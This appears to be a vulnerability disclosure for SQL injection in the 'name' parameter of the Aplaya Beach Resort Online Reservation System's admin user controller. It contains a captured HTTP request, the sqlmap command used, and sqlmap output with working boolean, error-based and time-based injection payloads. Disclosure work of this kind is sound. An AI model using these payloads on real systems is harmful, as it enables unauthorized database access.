@@ -1,0 +1,51 @@
+Vulnerability discovery author:Qianyongcun
+
+Aplaya Beach Resort Online Reservation System - SQL Injection on(admin/mod_users/controller.php?action=add name parameter) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/aplaya-beach-resort-online-reservation-system.html 
+
+Version:V1.0
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+admin/mod_users/controller.php
+On this page, name parameter is vulnerable to SQL Injection Attack 
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Request:
+POST /aplaya/admin/mod_users/controller.php?action=add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 105
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
+Origin: http://localhost
+Referer: http://localhost/aplaya/admin/mod_users/index.php?view=add
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+deptid=&deptid=&deptid=&name=admin&pass=admin&save=&type=Administrator&username=admin
+
+-> sqlmap -r 1.txt(above request package) --batch
+
+Output:
+
+---
+Parameter: name (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: deptid=&deptid=&deptid=&name=admin' AND 9348=9348 AND 'nrfY'='nrfY&pass=admin&save=&type=Administrator&username=admin
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: deptid=&deptid=&deptid=&name=admin' AND (SELECT 5948 FROM(SELECT COUNT(*),CONCAT(0x7162787871,(SELECT (ELT(5948=5948,1))),0x71786a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'hMQv'='hMQv&pass=admin&save=&type=Administrator&username=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: deptid=&deptid=&deptid=&name=admin' AND (SELECT 3813 FROM (SELECT(SLEEP(5)))fwRT) AND 'Shaq'='Shaq&pass=admin&save=&type=Administrator&username=admin
+---
+[06:50:22] [INFO] the back-end DBMS is MySQL
